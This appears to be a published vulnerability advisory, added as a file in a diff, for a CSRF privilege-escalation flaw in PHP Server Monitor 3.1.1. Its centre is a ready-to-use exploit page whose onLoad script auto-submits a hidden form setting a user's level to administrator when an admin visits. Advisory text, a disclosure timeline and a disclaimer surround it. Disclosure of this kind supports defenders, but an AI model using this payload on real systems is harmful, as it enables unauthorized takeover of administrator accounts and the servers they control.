@@ -1,0 +1,100 @@
+<!--
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-PHPSRVMONITOR-PRIV-ESCALATE.txt
+
+
+Vendor:
+================================
+www.phpservermonitor.org
+sourceforge.net/projects/phpservermon/files/phpservermon/PHP%20Server%20Monitor%20v3.1.1/phpservermon-3.1.1.zip/download
+
+
+Product:
+================================
+PHP Server Monitor 3.1.1
+
+
+Vulnerability Type:
+=================================
+Privilege Escalation / CSRF
+
+
+Vulnerability Details:
+=====================
+
+PHP Server Monitor uses level 20 for basic user and level 10 for Admins these are stored in Database. Basic users can elevate thier privileges to that of Administrator
+by crafting an HTTP payload changing their level to '10' then getting an Administrator to click an infected link or visit a malicious website to launch an
+CSRF attack which will grant the user admin access. This problem is due to no CSRF protection mechanism in place. 
+
+
+Exploit code(s):
+===============
+
+1) privilege escalation / CSRF
+-->
+
+<!DOCTYPE>
+<html>
+<body onLoad="doit()">
+<script>
+function doit(){
+var e=document.getElementById('HELL')
+e.submit()
+}
+</script>
+
+<form id="HELL" action="http://localhost/phpservermon-3.1.1/?&mod=user&action=save&id=3" method="post">
+<input type="text" name="user_name" value="hyp3rlinx" >
+<input type="text" name="name" value="hyp3rlinx">
+<input type="text" name="level" value="10">
+<input type="text" name="password" value="">
+<input type="text" name="password_repeat" value="">
+<input type="text" name="email" value="ghostofsin@abyss.com">
+<input type="text" name="mobile" value="">
+<input type="text" name="pushover_key" value="">
+<input type="text" name="pushover_device" value="">
+</form>
+
+
+</body>
+</html>
+
+
+<!--
+Exploitation Technique:
+=======================
+Remote
+
+
+Disclosure Timeline:
+=========================================================
+Vendor Notification: NA
+Oct 30, 2015  : Public Disclosure
+
+
+Severity Level:
+=========================================================
+High
+
+
+Description:
+==========================================================
+
+
+Request Method(s):              [+]  POST
+
+
+Vulnerable Product:             [+]  PHP Server Monitor 3.1.1
+  
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
+The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
+
+by hyp3rlinx
+-->
